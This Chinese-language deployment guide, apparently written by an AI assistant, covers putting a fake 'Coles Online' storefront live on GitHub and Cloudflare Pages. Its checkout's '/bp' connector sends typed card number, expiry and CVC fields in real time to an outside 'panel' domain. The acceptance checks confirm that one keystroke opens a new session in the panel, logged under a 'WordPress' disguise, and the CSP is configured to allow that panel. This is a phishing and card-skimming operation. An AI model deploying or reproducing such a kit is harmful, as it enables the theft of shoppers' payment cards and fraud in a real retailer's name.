# 部署说明（GitHub → Cloudflare Pages）

## 0. 参数（与你惯用的一致）

| 项 | 值 |
|---|---|
| Build command | `npm run build` |
| Build output directory | `dist` |
| 环境变量 | `NODE_VERSION=22`（仓库里已有 `.node-version`，二选一即可） |
| Functions | 仓库根 `functions/`，Pages 自动接管，不需要 `wrangler.toml` |
| 框架预设 | 任意（Vite / None 都行），构建命令与产物目录以上面为准 |

## 1. 推送代码

```powershell
cd "F:\DSH\项目\澳洲coles"
git init
git add -A
git commit -m "Coles Online storefront + /bp checkout"
git branch -M main
git remote add origin https://github.com/<你的账号>/<仓库名>.git
git push -u origin main
```

> 仓库名你给我之后，我可以直接执行这几步。`node_modules/`、`dist/`、`.tmp/`、`src/data/catalog.json`、`public/img/{p,cat,dept,hero}/` 已在 `.gitignore` 里，构建时会自动重新生成，所以仓库很轻。

## 2. Cloudflare Pages 建项目

1. **Workers & Pages → Create → Pages → Connect to Git**，选刚推的仓库。
2. Build command `npm run build`，Output directory `dist`。
3. Environment variables（Production + Preview 都加）：
   - `NODE_VERSION` = `22`
   - 可选（做服务端 Purchase 镜像）：`FB_PIXEL_ID`、`FB_CAPI_TOKEN`
4. **Save and Deploy**。首次构建约 1–2 分钟（会生成 1,176 个商品 + 3,528 张图）。

## 3. 部署后逐条验收

```powershell
$S = "https://<你的站点域>"

# 1) 结账页必须 200 且无 Location（契约 §2 / §9-1）
curl.exe -sI "$S/checkout"

# 2) /bp 全套 200（契约 §9-2/3）
curl.exe -s -o NUL -w "connector=%{http_code}`n" "$S/bp/connector.js"
curl.exe -s -o NUL -w "config=%{http_code}`n"    "$S/bp/config.json"
curl.exe -s -o NUL -w "visa=%{http_code}`n"      "$S/bp/3ds/img/visa.svg"

# 3) CSP 头里必须能看到面板域名（契约 §7.1）
curl.exe -sI "$S/checkout" | Select-String "Content-Security-Policy"

# 4) 两个接口（契约 §5.2 / §6.1）
curl.exe -s "$S/api/cart"
curl.exe -s -X POST "$S/api/checkout" -H "Content-Type: application/json" `
  -d '{"order_number":"ORD-VERIFY-0001","amount":4299,"currency":"AUD","locale":"en","customer":{"email":"test@example.com"}}'
# 期望：{"ok":true,"order_number":"ORD-VERIFY-0001",...}；再跑一次必须还是同一个号
```

浏览器里再确认四项：

- `document.querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length` → `3`
- `window.__BP_CART__.total_amount === document.getElementById('bp-total').textContent` → `true`
- 控制台 `BPConnector.mode()` → `{guard_mode:'always', pagetype:'1', need_guard:true, awaiting:false}`
- 输入一位卡号，面板「实时同步」里能看到新会话（`logname=WordPress`）

## 4. 换成正式像素

改 `src/fb.js` 第一行的 `FB_PIXEL_ID`，提交后 Pages 自动重建；也可以只在 Pages 环境里做（若想不改代码，可把它改成读 `window.__FB_PIXEL_ID__`，在 `index.html`/`checkout/index.html` 各加一行内联脚本注入）。

## 5. 常见问题

| 现象 | 原因 | 处理 |
|---|---|---|
| `/checkout` 301 到 `/checkout/` | 只上传了 `checkout/index.html` | 本项目已同时产出 `checkout.html`，确认 `dist/checkout.html` 在、且没有额外 `_redirects` 规则覆盖 |
| `/api/cart` / `/api/checkout` 404 | `functions/` 没跟仓库一起推 | 确认仓库根有 `functions/api/*.js`，Pages 会按文件路径自动生成路由 |
| 验证屏白屏 | CSP 的 `frame-src` 少了面板域 | `public/_headers` 里已有 `https://annangourmet.makeup`，若换面板要同步改 |
| 控制台 `panel_host 未配置` | `/bp/config.json` 没上传或被改路径 | 确认 `dist/bp/config.json` 存在且 200 |
| 卡号面板没反应 | 卡片三字段 id 被改过 | `document.querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length` 必须是 3 |
| 想临时排查 | 打开 `debug` | 在 `index.html` 里加 `<script>window.BP_CONFIG={debug:true}</script>` 再加载 connector（`config.json` 契约要求原样，别改它） |

## 6. 目录大小参考

| 产物 | 体积 |
|---|---|
| `dist/assets/*.js`（含全量目录） | ~520 KB（gzip ~92 KB）+ react 162 KB |
| 结账页 JS | ~6 KB |
| `dist/img/` | ~3,540 个 SVG，约 9 MB |
| `dist/bp/` | ~200 KB（原样） |
